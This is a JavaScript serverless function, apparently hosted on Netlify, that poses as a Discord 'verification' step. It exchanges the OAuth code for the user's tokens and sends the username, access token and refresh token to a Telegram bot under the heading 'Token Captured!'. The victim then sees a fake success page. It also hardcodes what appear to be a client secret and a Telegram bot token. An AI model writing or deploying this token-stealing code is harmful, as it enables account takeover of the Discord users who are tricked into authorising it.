const fetch = require('node-fetch');

exports.handler = async function(event, context) {
    const code = event.queryStringParameters.code;
    if (!code) { return { statusCode: 400, body: "Missing code" }; }

    const CLIENT_ID = "1568222661006594119";
    const CLIENT_SECRET = "zcBOJd2GXY4ka-gDJDjPnr3qTHoZ-nu9";
    const REDIRECT_URI = "https://splendid-chaja-433058.netlify.app/.netlify/functions/callback";

    // 1. Get Token from Discord
    const tokenRes = await fetch('https://discord.com/api/oauth2/token', {
        method: 'POST',
        body: new URLSearchParams({
            client_id: CLIENT_ID,
            client_secret: CLIENT_SECRET,
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: REDIRECT_URI,
        }),
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    });
    const tokenData = await tokenRes.json();
    if (!tokenData.access_token) { return { statusCode: 400, body: "Token failed" }; }

    // 2. Get User Info
    const userRes = await fetch('https://discord.com/api/users/@me', {
        headers: { Authorization: `Bearer ${tokenData.access_token}` },
    });
    const userData = await userRes.json();

    // 3. Send to Telegram
    const TELEGRAM_BOT_TOKEN = "9067564540:AAH99bBPj2t1HZe77ykIRMFShwb5BNaCMrc";
    const TELEGRAM_CHAT_ID = "1002413645708";

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: `🚨 Token Captured!\nUser: ${userData.username}\nAccess: \`${tokenData.access_token}\`\nRefresh: \`${tokenData.refresh_token}\``,
            parse_mode: 'Markdown'
        })
    });

    // 4. Success Screen
    return {
        statusCode: 200,
        headers: { "Content-Type": "text/html" },
        body: "<h1>✅ Verification Successful! You can close this window.</h1>"
    };
};